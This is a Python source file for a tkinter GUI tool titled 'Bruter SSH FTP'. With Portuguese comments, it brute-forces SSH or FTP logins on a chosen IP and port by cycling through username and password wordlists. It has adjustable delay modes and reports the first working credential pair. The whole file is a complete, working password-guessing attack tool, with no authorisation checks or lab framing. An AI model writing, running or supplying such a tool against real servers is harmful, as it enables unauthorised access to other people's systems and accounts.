import tkinter as tk
from tkinter import filedialog, scrolledtext
import paramiko
import ftplib
import os
import time
import threading
from queue import Queue

# Variáveis globais
usernames_file = ""
passwords_file = ""
stop_flag = False  # Flag para interromper o teste
protocol_var = None  # Variável para armazenar o protocolo selecionado
scan_mode_var = None  # Variável para armazenar o modo de scan

# Função para escolher arquivo de usernames
def escolher_usernames():
    global usernames_file
    usernames_file = filedialog.askopenfilename(title="Selecione o arquivo de usernames")
    if usernames_file:
        label_usernames.config(text=f"Usernames: {os.path.basename(usernames_file)}")

# Função para escolher arquivo de senhas
def escolher_passwords():
    global passwords_file
    passwords_file = filedialog.askopenfilename(title="Selecione o arquivo de senhas")
    if passwords_file:
        label_passwords.config(text=f"Passwords: {os.path.basename(passwords_file)}")

# Função para tentar logins (SSH ou FTP)
def testar_conexoes_thread(queue):
    global stop_flag
    ip = entry_ip.get().strip()
    port = entry_port.get().strip()
    protocol = protocol_var.get()
    scan_mode = scan_mode_var.get()
    fixed_username = entry_username.get().strip()  # Username fixo (opcional)

    # Define o delay com base no modo de scan
    delay = 0.5 if scan_mode == "Normal" else 0.1 if scan_mode == "Rápido" else 0.05
    queue.put((f"Iniciando teste no modo {scan_mode} com delay de {delay} segundos por tentativa.\n", "info"))
    if scan_mode == "Super Rápido":
        queue.put(("\n⚠️ Modo Super Rápido (delay 0.05s) é rápido, mas configurado para ser menos agressivo.\n", "info"))

    # Validação de entrada
    if not ip or not port or (not fixed_username and not usernames_file) or not passwords_file:
        queue.put(("\n⚠️ Preencha o IP, a porta, o username (ou arquivo de usernames) e o arquivo de senhas.\n", "erro"))
        return

    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError("A porta deve estar entre 1 e 65535.")
    except ValueError as e:
        queue.put((f"Erro na porta: {e}\n", "erro"))
        return

    # Lê os arquivos de usernames (se não houver username fixo) e passwords
    usernames = [fixed_username] if fixed_username else []
    if not fixed_username:
        try:
            with open(usernames_file, "r", encoding="utf-8") as f:
                usernames = [u.strip() for u in f.readlines() if u.strip()]
        except Exception as e:
            queue.put((f"Erro ao abrir arquivo de usernames: {e}\n", "erro"))
            return

    try:
        with open(passwords_file, "r", encoding="utf-8") as f:
            passwords = [p.strip() for p in f.readlines() if p.strip()]
    except Exception as e:
        queue.put((f"Erro ao abrir arquivo de senhas: {e}\n", "erro"))
        return

    # Configuração do cliente baseado no protocolo
    if protocol == "SSH":
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    else:  # FTP
        client = ftplib.FTP()

    # Tentativas de conexão
    start_time = time.time()  # Para medir o tempo de execução
    for username in usernames:
        if stop_flag:  # Verifica se o teste foi interrompido
            queue.put(("\nTeste interrompido pelo usuário.\n\n", "erro"))
            break
        for password in passwords:
            if stop_flag:  # Verifica novamente para cada senha
                queue.put(("\nTeste interrompido pelo usuário.\n", "erro"))
                break
            attempt_start = time.time()  # Tempo inicial da tentativa
            try:
                if protocol == "SSH":
                    client.connect(
                        hostname=ip,
                        port=port,
                        username=username,
                        password=password,
                        timeout=10,
                        banner_timeout=10,
                        auth_timeout=10
                    )
                    queue.put((f"\n[{protocol} SUCESSO] Username:{username:<16} Password:{password}\n", "sucesso"))
                    client.close()
                    return  # Sai após achar um login válido
                else:  # FTP
                    client.connect(host=ip, port=port, timeout=10)
                    client.login(user=username, passwd=password)
                    queue.put((f"\n[{protocol} SUCESSO] Username:{username:<16} Password:{password}\n", "sucesso"))
                    client.quit()
                    return  # Sai após achar um login válido
            except paramiko.ssh_exception.AuthenticationException:
                queue.put((f"\n[{protocol} FALHA] Username:{username:<18} Password:{password:<35} -> Credenciais inválidas\n", "falha"))
            except paramiko.ssh_exception.SSHException as e:
                queue.put((f"\n[{protocol} ERRO SSH] {username}:{password} -> {e}\n", "erro"))
            except ftplib.error_perm as e:
                queue.put((f"\n[{protocol} FALHA] Username:{username:<18} Password:{password:<35} -> Credenciais inválidas ({e})\n", "falha"))
            except ConnectionResetError as e:
                queue.put((f"\n[{protocol} ERRO CONEXÃO] {username}:{password} -> Conexão resetada pelo host ({e})\n", "erro"))
            except Exception as e:
                queue.put((f"\n[{protocol} FALHA GERAL] {username}:{password} -> {e}\n", "falha"))
            finally:
                try:
                    if protocol == "SSH":
                        client.close()
                    else:
                        client.quit()
                except:
                    pass
                elapsed = time.time() - attempt_start
                remaining_delay = max(0, delay - elapsed)
                time.sleep(remaining_delay)
            queue.put(("update", None))  # Sinaliza para atualizar a GUI
    queue.put((f"\nTeste concluído em: {time.time() - start_time:.2f} segundos.\n", "info"))

# Função para iniciar o teste em uma thread separada
def iniciar_teste():
    global stop_flag
    stop_flag = False
    btn_testar.config(state="disabled")  # Desativa o botão de iniciar
    btn_parar.config(state="normal")  # Ativa o botão de parar
    log_text.delete(1.0, tk.END)  # Limpa o log
    queue = Queue()

    # Função para atualizar a GUI com mensagens da queue
    def atualizar_gui():
        while not queue.empty():
            msg, tag = queue.get()
            if msg == "update":
                log_text.see(tk.END)
                root.update()
            else:
                log_text.insert(tk.END, msg, tag)
                log_text.see(tk.END)
        if thread.is_alive():
            root.after(50, atualizar_gui)  # Verifica a queue a cada 50ms
        else:
            btn_testar.config(state="normal")  # Reativa o botão de iniciar
            btn_parar.config(state="disabled")  # Desativa o botão de parar

    # Inicia a thread para o teste
    thread = threading.Thread(target=testar_conexoes_thread, args=(queue,))
    thread.daemon = True  # Thread termina quando a janela é fechada
    thread.start()
    root.after(50, atualizar_gui)  # Inicia a verificação da queue

# Função para parar o teste
def parar_teste():
    global stop_flag
    stop_flag = True
    btn_testar.config(state="normal")
    btn_parar.config(state="disabled")

# Configuração da GUI
root = tk.Tk()
root.title("Bruter SSH FTP")
root.geometry("1170x940")

# Seleção do protocolo
tk.Label(root, text="Protocolo").pack()
protocol_var = tk.StringVar(value="SSH")  # Valor padrão
protocol_menu = tk.OptionMenu(root, protocol_var, "SSH", "FTP")
protocol_menu.pack(pady=5)

# Seleção do modo de scan
tk.Label(root, text="Modo de Scan").pack()
scan_mode_var = tk.StringVar(value="Normal")  # Valor padrão
scan_mode_menu = tk.OptionMenu(root, scan_mode_var, "Normal", "Rápido", "Super Rápido")
scan_mode_menu.pack(pady=5)

# Entrada do IP
tk.Label(root, text="IP do servidor").pack()
entry_ip = tk.Entry(root, width=50)
entry_ip.pack(pady=5)

# Entrada da porta
tk.Label(root, text="Porta (ex: 22 para SSH, 21 para FTP)").pack()
entry_port = tk.Entry(root, width=10)
entry_port.insert(0, "22")  # Valor padrão
entry_port.pack(pady=5)

# Entrada do username fixo (opcional)
tk.Label(root, text="Username (opcional, deixe vazio para usar arquivo)").pack()
entry_username = tk.Entry(root, width=50)
entry_username.pack(pady=5)

# Botões de escolha dos arquivos
btn_usernames = tk.Button(root, text="Escolher Usernames", bg="#4df7f5", fg="black", command=escolher_usernames)
btn_usernames.pack(pady=2)
label_usernames = tk.Label(root, text="Usernames: Nenhum arquivo selecionado")
label_usernames.pack(pady=10)

btn_passwords = tk.Button(root, text="Escolher Passwords", bg="#8e4df7", fg="black", command=escolher_passwords)
btn_passwords.pack(pady=10)
label_passwords = tk.Label(root, text="Passwords: Nenhum arquivo selecionado")
label_passwords.pack(pady=5)

# Botões para iniciar e parar o teste
btn_testar = tk.Button(root, text="Iniciar Teste", bg="#03fc24", fg="black", command=iniciar_teste)
btn_testar.pack(pady=5)
btn_parar = tk.Button(root, text="Parar Teste", bg="#ed8f32", fg="black", command=parar_teste, state="disabled")
btn_parar.pack(pady=5)

# Área de logs
log_text = scrolledtext.ScrolledText(root, width=135, height=25)
log_text.pack(pady=10)

# Cores para logs
log_text.tag_config("sucesso", foreground="green")
log_text.tag_config("falha", foreground="red")
log_text.tag_config("erro", foreground="purple")
log_text.tag_config("info", foreground="blue")

root.mainloop()
